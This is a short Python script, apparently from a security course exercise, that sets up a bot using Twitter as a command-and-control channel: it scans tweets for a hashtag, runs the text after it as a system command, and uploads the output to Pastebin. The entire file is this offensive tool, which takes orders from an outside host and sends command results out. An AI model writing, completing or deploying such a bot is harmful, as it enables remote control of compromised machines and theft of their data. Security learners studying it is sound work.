#!/usr/bin/env python

# Author: SPSE-3232
# Purpose:
# - Create a bot which can use twitter as C&C
# - it will scan the public tweets using a #tag and a command will be inserted in the Tweet
# - eg. Tweet: #exec129834 ipconfig -a
# - The bot will now execute "ipconfig -a" and paste the result to pastebin

import requests
import os
import subprocess
from bs4 import BeautifulSoup

r = requests.get('https://twitter.com')

bs = BeautifulSoup(r.content, "html.parser")

for tweet in bs.findAll('p', {'class': 'TweetTextSize'}):
    tweet_text = tweet.get_text()
    if '#exec129834' in tweet_text:
        # Should be replaced by exec
        print(tweet_text)
        result = subprocess.run([tweet_text[11:]], stdout=subprocess.PIPE)
        # Publish on pastebin
        data = {
            'api_dev_key': os.getenv('PASTEBIN_DEV_KEY'),
            'api_paste_code': result.stdout,
        }

        r = requests.post('https://pastebin.com/api/api_post.php', data=data)